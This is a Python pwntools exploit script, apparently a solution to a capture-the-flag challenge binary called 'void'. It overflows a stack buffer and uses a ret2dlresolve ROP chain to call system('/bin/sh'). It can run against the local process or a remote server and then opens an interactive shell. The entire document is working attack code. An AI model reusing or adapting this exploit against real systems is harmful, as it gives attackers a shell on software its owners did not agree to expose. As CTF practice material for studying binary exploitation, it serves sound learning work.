from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([f] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([f] + argv, *a, **kw)
    
gdbscript = '''
init-pwndbg
b *0x00401122
continue
'''.format(**locals())

f = './void'
elf = context.binary = ELF(f, checksec=False)
io = start()

# https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html (challenge code exactly matches the example)

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
print(rop.dump())

io.sendline(flat({
    64+context.bytes: [
        raw_rop
    ], 
    200: dlresolve.payload
}))

if dlresolve.unreliable:
    io.poll(True) == -signal.SIGSEGV
else:
    io.interactive()